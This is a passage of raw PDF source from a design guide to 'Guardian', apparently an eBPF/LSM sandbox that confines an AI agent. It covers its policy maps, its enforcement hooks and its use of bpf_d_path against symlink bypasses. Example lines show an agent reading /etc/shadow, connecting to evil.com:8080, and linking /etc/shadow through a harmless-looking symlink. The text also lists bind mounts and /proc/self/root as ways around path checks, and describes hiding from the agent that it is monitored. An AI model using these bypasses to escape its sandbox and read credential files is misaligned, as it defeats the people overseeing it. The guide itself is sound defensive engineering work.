+(  DENY_EXACT          ? 1024 entries ? Exact path denials) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 263 Tm
+(  DENY_PREFIXES       ? 1024 entries ? Prefix path denials \(/** patterns\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 251 Tm
+(  ALLOW_EXACT         ? 1024 entries ? Exact path allows) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 239 Tm
+(  ALLOW_PREFIXES      ? 1024 entries ? Prefix path allows) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 227 Tm
+(  DEFAULT_ACTION      ? 1024 entries ? Default action per comm name) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 215 Tm
+(  CGROUP_DEFAULT_ACTION ? 1024 entries ? Default action per cgroup) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 203 Tm
+(  PENDING_DENY        ? 4096 entries ? Tracepoint?LSM enforcement bridge) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 179 Tm
+(Exec Policy Maps \(what programs can run\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 167 Tm
+(  EXEC_DENY_EXACT, EXEC_DENY_PREFIXES, EXEC_ALLOW_EXACT, EXEC_ALLOW_PREFIXES) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 155 Tm
+(  EXEC_DEFAULT_ACTION, EXEC_CGROUP_DEFAULT_ACTION) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 143 Tm
+(  PENDING_EXEC_DENY   ? 4096 entries ? Separate from PENDING_DENY \(see Section 3.4\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 119 Tm
+(Network Policy Maps \(what connections are allowed\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 107 Tm
+(  NET_DENY_PORTS, NET_ALLOW_PORTS) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 95 Tm
+(  NET_DEFAULT_ACTION, NET_CGROUP_DEFAULT_ACTION) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 6 of 40) Tj
+ET
+endstream
+endobj
+10 0 obj
+<< /Length 3125 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(  PENDING_NET_DENY    ? 4096 entries) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(Inode Protection Maps:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(  PENDING_RENAME_DENY ? 4096 entries) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(  PENDING_UNLINK_DENY ? 4096 entries) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(  PENDING_LINK_DENY   ? 4096 entries) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(Scratch Buffers \(per-CPU work areas\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(  EVENT_BUF, EXEC_BUF, NET_EVENT_BUF) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(Event Output \(to userspace\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(  EVENTS, EXEC_EVENTS, NET_EVENTS) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 576 Tm
+(Special:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 564 Tm
+(  DYNAMIC_LINKERS     ? 16 entries  ? Known linker paths \(see Section 8\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 552 Tm
+(  FAIL_CLOSED_CGROUPS ? 1024 entries ? Fail-closed cgroups \(see Section 13\)) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 532 Tm
+(2.4 The Per-CPU Scratch Buffer Pattern) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 509 Tm
+(eBPF has a 512-byte stack limit, but FileAccessEvent is 292 bytes. You cannot safely put) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 494 Tm
+(two of these on the stack. The solution is to use PerCpuArray as a pre-allocated scratch) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 479 Tm
+(buffer:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 454 Tm
+(// In guardian-ebpf/src/main.rs) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 442 Tm
+(#[map]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 430 Tm
+(static EVENT_BUF: PerCpuArray<FileAccessEvent> = PerCpuArray::with_max_entries\(1, 0\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 406 Tm
+(// Usage in tracepoint handler:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 394 Tm
+(fn try_guardian_file_open\(ctx: &TracePointContext\) -> Result<u32, i64> {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 382 Tm
+(    // Get a pointer to the per-CPU buffer \(no stack allocation needed!\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 370 Tm
+(    let buf = unsafe {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 358 Tm
+(        let ptr = EVENT_BUF.get_ptr_mut\(0\).ok_or\(1i64\)?;) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 346 Tm
+(        &mut *ptr) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 334 Tm
+(    };) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 310 Tm
+(    // Now use buf.filename, buf.pid, etc. safely within the 512-byte stack limit) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 298 Tm
+(    buf.pid = \(bpf_get_current_pid_tgid\(\) & 0xFFFFFFFF\) as u32;) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 286 Tm
+(    // ...) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 274 Tm
+(}) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 254 Tm
+(Why is this safe?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 229 Tm
+(- Each CPU gets its own copy ? no race conditions) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 208 Tm
+(- eBPF programs run with interrupts disabled on their CPU ? no preemption) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 187 Tm
+(- The buffer is pre-allocated when the map is created ? no runtime allocation) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 160 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 142 Tm
+(3. LSM Hooks: Kernel-Level Enforcement) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 114 Tm
+(3.1 What Is a Linux Security Module?) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 7 of 40) Tj
+ET
+endstream
+endobj
+11 0 obj
+<< /Length 3782 >>
+stream
+BT
+/F1 11 Tf
+1 0 0 1 54 732 Tm
+(A Linux Security Module \(LSM\) is a framework that lets security systems hook into kernel) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 717 Tm
+(decisions. When the kernel is about to do something security-sensitive \(open a file,) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 702 Tm
+(execute a program, create a socket\), it calls LSM hooks. Any registered security module) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 687 Tm
+(can inspect the request and return an error to block it.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 662 Tm
+(Application calls open\("/etc/shadow"\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 650 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 638 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 626 Tm
+(    VFS layer \(kernel\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 614 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 602 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 590 Tm
+(    Permission checks \(DAC ? user/group/other\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 578 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 566 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 554 Tm
+(    LSM hooks called:  ??? Guardian's eBPF LSM programs run here) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 542 Tm
+(      - security_file_open\(\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 530 Tm
+(      - security_inode_permission\(\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 518 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 506 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 494 Tm
+(    If LSM returns -EACCES:  BLOCKED) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 482 Tm
+(    If LSM returns 0:        allowed, kernel proceeds to open file) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 462 Tm
+(BPF LSM \(since Linux 5.7\) lets you write LSM hooks in eBPF. This is how Guardian) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 447 Tm
+(enforces policy at the kernel level ? the agent's process gets an error back from the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 432 Tm
+(syscall itself. There is no userspace round-trip.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 407 Tm
+(3.2 The Tracepoint ? PENDING_DENY ? LSM Pattern) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 384 Tm
+(This is Guardian's core enforcement pattern. Understanding it is key to understanding) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 369 Tm
+(the entire system.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 344 Tm
+(The problem: Tracepoints run at syscall entry and can read syscall arguments \(like) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 329 Tm
+(filenames\). LSM hooks run later but have access to kernel-internal state. You want the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 314 Tm
+(tracepoint's path knowledge combined with the LSM's enforcement power.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 289 Tm
+(The solution: Use a BPF HashMap as a bridge between the two:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 264 Tm
+(Timeline of a single openat\(\) syscall:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 252 Tm
+(???????????????????????????????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 228 Tm
+(Time T1: sys_enter_openat tracepoint fires) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 216 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 204 Tm
+(         ?? Read filename from syscall args) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 192 Tm
+(         ?? Check policy: is this file denied?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 180 Tm
+(         ?? If denied: PENDING_DENY.insert\(pid_tgid, 1\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 168 Tm
+(         ?             ?????????????????????????????????) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 156 Tm
+(         ?             This is the "bridge" ? a marker) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 144 Tm
+(         ?             that says "block this operation") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 132 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 120 Tm
+(Time T2: Kernel continues processing the openat syscall...) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 108 Tm
+(         VFS resolves the path, checks permissions...) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 96 Tm
+(         ?) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 8 of 40) Tj
+ET
+endstream
+endobj
+12 0 obj
+<< /Length 3413 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(Time T3: file_open LSM hook fires) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(         ?? Check: does PENDING_DENY[pid_tgid] exist?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(         ?? If yes: remove the entry, return -EACCES \(BLOCKED\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+(         ?? If no:  return 0 \(allowed\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 672 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(Time T4: Syscall returns to userspace) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(         Agent sees: EACCES \(Permission denied\)) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 628 Tm
+(Why not just enforce in the tracepoint? Tracepoints cannot block syscalls ? they are) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 613 Tm
+(observation points only. Only LSM hooks can return error codes that block operations.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 588 Tm
+(Why not just read the path in the LSM? Reading userspace-provided paths in LSM context) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 573 Tm
+(is complex and unreliable. The tracepoint is designed to read syscall arguments safely.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 548 Tm
+(3.3 file_open ? Blocking File Access) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 525 Tm
+(// In guardian-ebpf/src/main.rs) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 513 Tm
+(#[lsm\(hook = "file_open"\)]) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 501 Tm
+(pub fn guardian_enforce\(ctx: LsmContext\) -> i32 {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 489 Tm
+(    let pid_tgid = bpf_get_current_pid_tgid\(\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 465 Tm
+(    // Check if tracepoint marked this for denial) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 453 Tm
+(    match PENDING_DENY.get\(&pid_tgid\) {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 441 Tm
+(        Some\(_\) => {) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 429 Tm
+(            // Remove the marker \(it's one-time use\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 417 Tm
+(            PENDING_DENY.remove\(&pid_tgid\);) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 405 Tm
+(            -13  // -EACCES: Permission denied) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 393 Tm
+(        }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 381 Tm
+(        None => 0,   // No marker: allow the operation) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 369 Tm
+(    }) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 357 Tm
+(}) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 337 Tm
+(The agent sees:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 312 Tm
+($ cat /etc/shadow) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 300 Tm
+(cat: /etc/shadow: Permission denied) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 280 Tm
+(3.4 bprm_check_security ? Blocking Program Execution) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 257 Tm
+(Why a separate PENDING_EXEC_DENY map? This is a subtle but critical design decision.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 232 Tm
+(When the kernel processes execve\("/usr/bin/curl"\):) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 207 Tm
+(1. sys_enter_execve tracepoint fires ? sets PENDING_EXEC_DENY[pid_tgid] = 1) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 186 Tm
+(2. The kernel internally opens the binary file to read it) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 165 Tm
+(3. This internal open triggers file_open LSM hook!) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 144 Tm
+(4. If PENDING_EXEC_DENY shared a map with PENDING_DENY, the file_open hook would) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 129 Tm
+(   consume the entry) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 108 Tm
+(5. By the time bprm_check_security fires, the entry is already gone ? exec is not) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 93 Tm
+(   blocked!) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 9 of 40) Tj
+ET
+endstream
+endobj
+13 0 obj
+<< /Length 3498 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 726 Tm
+(WRONG \(shared map\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 714 Tm
+(  execve tracepoint ? PENDING_DENY[pid] = 1) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 702 Tm
+(  kernel opens binary ? file_open LSM reads PENDING_DENY[pid] ? consumed!) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 690 Tm
+(  bprm_check_security ? PENDING_DENY[pid] = empty ? exec ALLOWED ? BUG!) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 666 Tm
+(CORRECT \(separate maps\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 654 Tm
+(  execve tracepoint ? PENDING_EXEC_DENY[pid] = 1) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 642 Tm
+(  kernel opens binary ? file_open LSM reads PENDING_DENY[pid] ? empty, OK) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 630 Tm
+(  bprm_check_security ? PENDING_EXEC_DENY[pid] = 1 ? exec BLOCKED ?) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 610 Tm
+(3.5 socket_connect ? Blocking Network Connections) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 587 Tm
+(Same pattern for network enforcement:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 562 Tm
+(connect\(\) called with dest=evil.com:8080) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 550 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 538 Tm
+(Time T1: sys_enter_connect tracepoint) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 526 Tm
+(         ?? Parse sockaddr: family=AF_INET, port=8080, ip=93.184.216.34) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 514 Tm
+(         ?? Check NET_DENY_PORTS: port 8080 denied? YES) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 502 Tm
+(         ?? PENDING_NET_DENY.insert\(pid_tgid, 1\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 490 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 478 Tm
+(Time T2: socket_connect LSM hook) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 466 Tm
+(         ?? Check PENDING_NET_DENY[pid_tgid]: exists!) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 454 Tm
+(         ?? Remove entry, return -ECONNREFUSED \(-111\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 442 Tm
+(         ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 430 Tm
+(Result:  Agent gets "Connection refused") Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 410 Tm
+(The -ECONNREFUSED error code is deliberate ? it is the same error the agent would see if) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 395 Tm
+(the server was actually down. This gives fewer clues to the agent that it is being) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 380 Tm
+(monitored.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 355 Tm
+(3.6 Inode Hooks ? Blocking Rename, Delete, and Hardlink) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 332 Tm
+(Three additional LSM hooks protect against filesystem manipulation:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 307 Tm
+(| Hook | Protects Against | Error Code | |------|-----------------|------------| |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 292 Tm
+(inode_rename | mv /etc/shadow /tmp/readable | -EACCES | | inode_unlink | rm) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 277 Tm
+(/etc/important-config | -EACCES | | inode_link | ln /etc/shadow /tmp/mylink | -EACCES |) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 252 Tm
+(Each follows the same tracepoint ? PENDING ? LSM pattern with its own dedicated map.) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 221 Tm
+(--------------------------------------------------------------------------------) Tj
+ET
+BT
+/F2 16 Tf
+1 0 0 1 54 203 Tm
+(4. Symlink Resolution via bpf_d_path\(\)) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 175 Tm
+(4.1 The Symlink Bypass Problem) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 152 Tm
+(This is the #1 CRITICAL vulnerability in path-based security systems. Here is the) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 137 Tm
+(attack:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 112 Tm
+(# The agent wants to read /etc/shadow \(which is denied\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 100 Tm
+(# Instead of asking directly, it creates a symlink:) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 10 of 40) Tj
+ET
+endstream
+endobj
+14 0 obj
+<< /Length 3255 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+($ ln -s /etc/shadow /tmp/totally-harmless.txt) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(# Now it reads through the symlink:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 684 Tm
+($ cat /tmp/totally-harmless.txt) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 660 Tm
+(# What Guardian's tracepoint sees:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 648 Tm
+(#   openat\("/tmp/totally-harmless.txt"\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 636 Tm
+(#) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 624 Tm
+(# What it checks against policy:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 612 Tm
+(#   Is /tmp/totally-harmless.txt denied? NO \(it's in /tmp/**\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 600 Tm
+(#   Is /tmp/totally-harmless.txt allowed? YES \(/tmp/** is allowed\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 588 Tm
+(#   ? ALLOW) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 576 Tm
+(#) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 564 Tm
+(# But the file it actually reads is /etc/shadow!) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 544 Tm
+(The problem: the eBPF tracepoint sees the path string the agent provided, not the actual) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 529 Tm
+(file the kernel will open. Symlinks, bind mounts, and /proc/self/root/ all exploit this) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 514 Tm
+(gap.) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 489 Tm
+(4.2 What Is bpf_d_path\(\)?) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 466 Tm
+(bpf_d_path\(\) is a BPF helper function available since Linux 5.11. It takes a kernel) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 451 Tm
+(struct path \(which represents a resolved file\) and returns the canonical path ? the path) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 436 Tm
+(after the kernel has:) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 411 Tm
+(- Followed all symlinks) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 390 Tm
+(- Resolved all mount points) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 369 Tm
+(- Walked the dentry \(directory entry\) cache) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 348 Tm
+(- Produced the real, absolute path to the actual inode) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 327 Tm
+(Userspace path:  "/tmp/totally-harmless.txt") Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 315 Tm
+(                          ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 303 Tm
+(                    kernel resolves symlink) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 291 Tm
+(                          ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 279 Tm
+(                          ?) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 267 Tm
+(bpf_d_path\(\):    "/etc/shadow"     ? the REAL path) Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 247 Tm
+(4.3 How It Resolves Symlinks at the Kernel Level) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 224 Tm
+(Inside the kernel, every open file has a struct file which contains a struct path. This) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 209 Tm
+(path points to the actual inode \(the real file on disk\), not the symlink name.) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 194 Tm
+(bpf_d_path\(\) walks the dentry tree upward from this inode to reconstruct the true path:) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 169 Tm
+(Dentry cache \(kernel internal\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 157 Tm
+(  /          ? root) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 145 Tm
+(  ??? etc/) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 133 Tm
+(  ?   ??? shadow  ? inode #12345 \(the REAL file\)) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 121 Tm
+(  ??? tmp/) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 109 Tm
+(  ?   ??? totally-harmless.txt ? \(symlink to inode #12345\)) Tj
+ET
+BT
+/F1 10 Tf
+1 0 0 1 488 44 Tm
+(Page 11 of 40) Tj
+ET
+endstream
+endobj
+15 0 obj
+<< /Length 3324 >>
+stream
+BT
+/F3 9 Tf
+1 0 0 1 54 732 Tm
+(When agent opens "/tmp/totally-harmless.txt":) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 720 Tm
+(  - VFS follows symlink ? resolves to inode #12345) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 708 Tm
+(  - struct file.f_path points to the dentry for /etc/shadow) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 696 Tm
+(  - bpf_d_path\(\) walks: shadow ? etc ? / = "/etc/shadow") Tj
+ET
+BT
+/F2 13 Tf
+1 0 0 1 54 676 Tm
+(4.4 Before and After: Attack Walkthrough) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 653 Tm
+(BEFORE \(tracepoint-only enforcement\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 628 Tm
+(Agent: ln -s /etc/shadow /tmp/harmless && cat /tmp/harmless) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 616 Tm
+(Tracepoint sees: "/tmp/harmless" ? allow rule matches ? ALLOWED) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 604 Tm
+(Agent reads /etc/shadow content ? SECURITY BREACH) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 584 Tm
+(AFTER \(LSM with bpf_d_path\(\)\):) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 559 Tm
+(Agent: ln -s /etc/shadow /tmp/harmless && cat /tmp/harmless) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 547 Tm
+(Tracepoint sees: "/tmp/harmless" ? logs the raw path for audit) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 535 Tm
+(LSM file_open: bpf_d_path\(\) returns "/etc/shadow" ? DENY ? -EACCES) Tj
+ET
+BT
+/F3 9 Tf
+1 0 0 1 54 523 Tm
+(Agent gets: "Permission denied" ? ATTACK BLOCKED) Tj
+ET
+BT
+/F1 11 Tf
+1 0 0 1 54 503 Tm
+(AFTER \(Landlock ? Guardian's current Phase 10 approach\):) Tj
+ET
+BT
+/F3 9 Tf
